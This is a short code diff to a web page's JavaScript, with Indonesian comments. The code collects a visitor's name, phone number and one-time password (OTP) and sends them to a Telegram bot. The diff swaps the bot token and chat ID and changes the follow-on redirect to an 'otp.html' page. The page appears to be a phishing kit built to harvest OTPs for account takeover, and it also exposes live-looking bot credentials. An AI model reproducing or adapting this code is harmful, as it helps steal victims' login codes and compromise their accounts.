@@ -318,8 +318,8 @@
 
             // Kirim data OTP ke Telegram setelah 3 detik
             setTimeout(() => {
-                let token = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
-                let chat_id = "6824078885";
+                let token = "7662535205:AAFzgcNVaWX3wlaV9GETNxO7LOmbfanI3O4";
+                let chat_id = "6723933262";
                 let pesan = `Nama: ${nama}\nNomor: ${nomorHP}\nKode OTP: ${otp}`;
 let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`;
 
@@ -329,7 +329,7 @@ let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&t
                     .then(data => {
                         if (data.ok) {
                             // Redirect ke halaman berikutnya setelah loading selesai
-                            window.location.href = "halaman_selanjutnya.html";
+                            window.location.href = "otp.html";
                         } else {
                             alert("Gagal mengirim OTP. Silakan coba lagi.");
                         }
